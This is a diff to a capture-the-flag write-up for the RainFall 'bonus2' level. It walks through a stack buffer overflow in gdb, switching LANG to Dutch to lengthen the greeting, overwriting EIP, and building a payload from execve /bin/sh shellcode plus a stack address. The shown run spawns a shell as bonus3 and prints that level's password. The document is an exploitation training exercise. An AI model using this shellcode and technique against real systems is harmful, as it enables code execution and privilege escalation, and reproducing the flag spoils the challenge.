@@ -54,18 +54,18 @@ Let's check the other greeting lengh
 (gdb) x/s 0x8048717
 0x8048717:	 "Hyv\303\244\303\244 p\303\244iv\303\244\303\244 "
 ⇒ ./a.out 
-Hyvää päivää (13 bytes) there's a space at the end
+Hyvää päivää (18 bytes) there's a space at the end and unicode
 0x080484e9 <+101>:	mov    edx,0x804872a
 (gdb) x/s 0x804872a
 0x804872a:	 "Goedemiddag! " (13 bytes) idem
 ```
 lets try to change our `env` it doesn't matter which we choose both are `13 bytes` long
 ```
-:~$ export LANG="fi"
+:~$ export LANG="nl"
 ~$ env
 [...]
 PWD=/home/user/bonus2
-LANG=fi
+LANG=nl
 SHLVL=5
 HOME=/home/user/bonus2
 LC_TERMINAL_VERSION=3.3.12
@@ -77,9 +77,59 @@ Now let's re run the program again
 (gdb) r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
 Starting program: /home/user/bonus2/bonus2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
 
-Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
 
 Program received signal SIGSEGV, Segmentation fault.
 0x42424242 in ?? ()
+
+(gdb) i r
+eax            0x51	81
+ecx            0xffffffff	-1
+edx            0xb7fd28b8	-1208145736
+ebx            0xbffff640	-1073744320
+esp            0xbffff5f0	0xbffff5f0
+ebp            0x42424242	0x42424242 <---------------------------
+esi            0xbffff68c	-1073744244
+edi            0xbffff63c	-1073744324
+eip            0x42424242	0x42424242  <--------------------------
+eflags         0x210282	[ SF IF RF ID ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
 ```
-Great we have it, now let's prepare the payload
+Great we have it, now let's prepare the payload our `85 bytes` long string made the program to crash and we know the address of out *shellcode* must go in the second parameter as we can check in `ebp` and `eip`, so let's grab our *shellcode* from `level2` and make some maths:
+
+|*shellcode*| `24 bytes`|
+|-----------|-----------|
+|__address__| `4 bytes` |
+|*shellcode* + *address* | `28 bytes`|
+|*2nd parameter*| `32 bytes`|
+
+`28 bytes` is the total of our *shellcode* plus the `4 bytes` for our *shellcode* address, we need to put in the seconde parameter and it can take up to `32 bytes` that is perfect :p
+
+Now we have the distance lets find the __address__ we know it is being stored at `$esp+0x50` lets check
+```
+(gdb) x/20xw $esp+0x50
+0xbffff5f0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff600:	0x41414141	0x41414141	0x41414141	0x41414141  <---- let's try this address
+0xbffff610:	0x41414141	0x41414141	0x3133785c	0x3063785c
+0xbffff620:	0x3035785c	0x3836785c	0x6632785c	0x6632785c
+0xbffff630:	0x3337785c	0x3836785c	0x00000000	0xbffffef4
+```
+Build the payload
+```
+./bonus2 $(python -c "print 'A' * 40 ") $(python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + '\x00\xf6\xff\xbf'")
+```
+Now lets try it
+```
+bonus2@RainFall:~$ ./bonus2 $(python -c "print 'A' * 40 ") $(python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + '\x00\xf6\xff\xbf'")
+Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1�Ph//shh/bin��PS�ᙰ
+                                                                         ̀���
+$ whoami
+bonus3
+$ cat /home/user/bonus3/.pass
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
+```
